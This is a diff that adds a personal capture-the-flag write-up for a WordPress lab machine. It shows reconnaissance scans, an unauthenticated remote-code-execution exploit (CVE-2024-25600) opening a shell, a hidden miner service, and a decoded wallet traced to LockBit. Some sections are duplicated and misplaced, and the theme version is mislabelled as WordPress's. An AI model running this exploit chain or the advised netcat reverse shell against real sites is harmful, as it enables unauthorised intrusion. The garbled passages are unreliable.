@@ -1,0 +1,353 @@
+****IMPORTANT POINT TO REMEMBER ALWAYS GET THE REVERSE SHELL ACCESS AFTER GETTING SHELL USING NETCAT NC****
+
+---
+
+# Approach To Solve
+
+1. **Reconnaissance & Enumeration**
+2. **Vulnerability Analysis**
+3. **Exploitation**
+4. **Privilege Escalation**
+5. Learning Strategies
+
+---
+
+# 1- Recon.
+
+```jsx
+nmap -sC -sV -O -A 10.49.144.150
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-16 17:16 IST
+Nmap scan report for bricks.thm (10.49.144.150)
+Host is up (0.011s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 5c:ce:b2:8f:6a:90:de:79:40:71:0b:37:f4:a0:d4:b1 (RSA)
+|   256 08:21:42:23:b3:de:ec:95:0f:20:06:a9:66:5a:c4:35 (ECDSA)
+|_  256 e8:40:b0:cd:26:a7:20:c6:50:2f:89:38:74:ba:b6:0d (ED25519)
+80/tcp   open  http     Python http.server 3.5 - 3.10
+|_http-title: Error response
+|_http-server-header: WebSockify Python/3.8.10
+443/tcp  open  ssl/http Apache httpd
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
+| Not valid before: 2024-04-02T11:59:14
+|_Not valid after:  2025-04-02T11:59:14
+|_http-generator: WordPress 6.5
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_http-title: Brick by Brick
+3306/tcp open  mysql    MySQL (unauthorized)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=1/16%OT=22%CT=1%CU=35372%PV=Y%DS=3%DC=T%G=Y%TM=696A254
+OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=106%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%
+OS:CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%G
+OS:CD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4
+OS:E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
+OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%C
+OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
+OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
+OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
+OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
+OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 993/tcp)
+HOP RTT     ADDRESS
+1   6.12 ms 192.168.128.1
+2   ...
+3   7.94 ms bricks.thm (10.49.144.150)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.84 seconds
+
+```
+
+- During this nmap scan i found Port 443 is running Word Press
+- So I used wpscan tool to scan the url
+
+```jsx
+wpscan --url https://bricks.thm --disable-tls-checks                                                                
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: https://bricks.thm/ [10.49.144.150]
+[+] Started: Fri Jan 16 17:35:43 2026
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: server: Apache
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: https://bricks.thm/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: https://bricks.thm/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
+ | Found By: Rss Generator (Passive Detection)
+ |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
+ |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>
+
+[+] WordPress theme in use: bricks
+ | Location: https://bricks.thm/wp-content/themes/bricks/
+ | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
+ | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
+ | Style Name: Bricks
+ | Style URI: https://bricksbuilder.io/
+ | Description: Visual website builder for WordPress....
+ | Author: Bricks
+ | Author URI: https://bricksbuilder.io/
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | Version: 1.9.5 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:03 <=========================================> (137 / 137) 100.00% Time: 00:00:03
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri Jan 16 17:35:52 2026
+[+] Requests Done: 170
+[+] Cached Requests: 7
+[+] Data Sent: 41.448 KB
+[+] Data Received: 110.502 KB
+[+] Memory used: 267.793 MB
+[+] Elapsed time: 00:00:09
+
+```
+
+# 2- Exploit
+
+To check if they are valid I went to https://www.blockchain.com/explorer/
+
+The **first address** was valid, confirming it as the answer.
+
+# **Identifying the Threat Group**
+
+The final step was to determine which **threat group** was associated with the **wallet address**.
+
+Press enter or click to view image in full size
+
+I tried searching on google our wallet addres but I found nothing, then searched for the receiver of a a big amount of BTC: **32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM**
+
+And found it:
+
+And on the page we clearly see that its LockBit.
+
+- After Scanning the the url i found the version of wordpress which is Version: 1.9.5.
+- So I googled for any CVE available for this version and found it.
+- In order to run that script we first have to open script and look for any thing required as a input or anything
+- Before Running Scripts
+    
+    Look for:
+    
+    - Target format (URL / IP)
+    - Required arguments
+    - What it actually does
+    - Any dangerous commands
+- Before running scripts install all the required modules
+
+```jsx
+python3 CVE-2024-25600.py -u https://bricks.thm/  ---- Run this exploit with this command
+And get the shell of the site
+
+python3 CVE-2024-25600.py -u https://bricks.thm/                                                                                 
+/home/axchawkeye/Downloads/CVE-2024-25600.py:20: SyntaxWarning: invalid escape sequence '\ '
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
+
+   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
+ / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
+/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
+\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
+    
+Coded By: K3ysTr0K3R --> Hello, Friend!
+
+[*] Checking if the target is vulnerable
+[+] The target is vulnerable
+[*] Initiating exploit against: https://bricks.thm/
+[*] Initiating interactive shell
+[+] Interactive shell opened successfully
+Shell> 
+
+```
+
+Now we have to check services running on the web app to see the suspicious services. The command is 
+
+```jsx
+systemctl list-units --type=service --state=running
+
+ UNIT                                           LOAD   ACTIVE SUB     DESCRIPTION                                                     
+  accounts-daemon.service                        loaded active running Accounts Service                                                
+  acpid.service                                  loaded active running ACPI event daemon                                               
+  anacron.service                                loaded active running Run anacron jobs                                                
+  atd.service                                    loaded active running Deferred execution scheduler                                    
+  avahi-daemon.service                           loaded active running Avahi mDNS/DNS-SD Stack                                         
+  badr.service                                   loaded active running Badr Service                                                    
+  cron.service                                   loaded active running Regular background program processing daemon                    
+  cups-browsed.service                           loaded active running Make remote CUPS printers available locally                     
+  cups.service                                   loaded active running CUPS Scheduler                                                  
+  dbus.service                                   loaded active running D-Bus System Message Bus                                        
+  getty@tty1.service                             loaded active running Getty on tty1                                                   
+  httpd.service                                  loaded active running LSB: starts Apache Web Server                                   
+  irqbalance.service                             loaded active running irqbalance daemon                                               
+  kerneloops.service                             loaded active running Tool to automatically collect and submit kernel crash signatures
+  lightdm.service                                loaded active running Light Display Manager                                           
+  ModemManager.service                           loaded active running Modem Manager                                                   
+  multipathd.service                             loaded active running Device-Mapper Multipath Device Controller                       
+  mysqld.service                                 loaded active running LSB: start and stop MySQL                                       
+  networkd-dispatcher.service                    loaded active running Dispatcher daemon for systemd-networkd                          
+  NetworkManager.service                         loaded active running Network Manager                                                 
+  polkit.service                                 loaded active running Authorization Manager                                           
+  rsyslog.service                                loaded active running System Logging Service                                          
+  rtkit-daemon.service                           loaded active running RealtimeKit Scheduling Policy Service                           
+  serial-getty@ttyS0.service                     loaded active running Serial Getty on ttyS0                                           
+  snap.amazon-ssm-agent.amazon-ssm-agent.service loaded active running Service for snap application amazon-ssm-agent.amazon-ssm-agent  
+  snapd.service                                  loaded active running Snap Daemon                                                     
+  ssh.service                                    loaded active running OpenBSD Secure Shell server                                     
+  switcheroo-control.service                     loaded active running Switcheroo Control Proxy service                                
+  systemd-journald.service                       loaded active running Journal Service                                                 
+  systemd-logind.service                         loaded active running Login Service                                                   
+  systemd-networkd.service                       loaded active running Network Service                                                 
+  systemd-resolved.service                       loaded active running Network Name Resolution                                         
+  systemd-timesyncd.service                      loaded active running Network Time Synchronization                                    
+  systemd-udevd.service                          loaded active running udev Kernel Device Manager                                      
+  ubuntu.service                                 loaded active running TRYHACK3M                                                       
+  udisks2.service                                loaded active running Disk Manager                                                    
+  unattended-upgrades.service                    loaded active running Unattended Upgrades Shutdown                                    
+  upower.service                                 loaded active running Daemon for power management                                     
+  user@1000.service                              loaded active running User Manager for UID 1000                                       
+  user@114.service                               loaded active running User Manager for UID 114                                        
+  whoopsie.service                               loaded active running crash report submission daemon                                  
+  wpa_supplicant.service                         loaded active running WPA supplicant                                                  
+
+LOAD   = Reflects whether the unit definition was properly loaded.
+ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
+SUB    = The low-level unit activation state, values depend on unit type.
+
+42 loaded units listed.
+
+```
+
+After getting the service which is running is suspicious than cat it to get the suspicious file
+
+```jsx
+systemctl cat ubuntu.service
+# /etc/systemd/system/ubuntu.service
+[Unit]
+Description=TRYHACK3M
+
+[Service]
+Type=simple
+ExecStart=/lib/NetworkManager/nm-inet-dialog
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Mostly the logs are stored in /var/log but here its saved in /lib/NetworkManager
+
+So ls it or open it using cat
+
+```jsx
+
+cat /lib/NetworkManager/inet.conf ------- this opens the file
+
+ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+2024-04-08 10:46:04,743 [*] confbak: Ready!
+2024-04-08 10:46:04,743 [*] Status: Mining!
+2024-04-08 10:46:08,745 [*] Miner()
+2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
+2024-04-08 10:46:08,745 [*] Status: Mining!
+2024-04-08 10:46:10,747 [*] Miner()
+2024-04-08 10:46:12,748 [*] Miner()
+2024-04-08 10:46:14,751 [*] Miner()
+2024-04-08 10:46:16,753 [*] Miner()
+2024-04-08 10:46:18,755 [*] Miner()
+2024-04-08 10:46:20,757 [*] Miner()
+2024-04-08 10:46:22,760 [*] Miner()
+2024-04-08 10:46:24,762 [*] Miner()
+ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+2024-04-08 10:48:04,647 [*] confbak: Ready!
+
+```
+
+Get The Id and paste in cyberchef for decoding it and got this
+
+```jsx
+bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
+```
+
+To check if they are valid I went to https://www.blockchain.com/explorer/
+
+The **first address** was valid, confirming it as the answer.
+
+# **Identifying the Threat Group**
+
+The final step was to determine which **threat group** was associated with the **wallet address**.
+
+Press enter or click to view image in full size
+
+I tried searching on google our wallet addres but I found nothing, then searched for the receiver of a a big amount of BTC: **32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM**
+
+And found it:
+
+And on the page we clearly see that its LockBit.
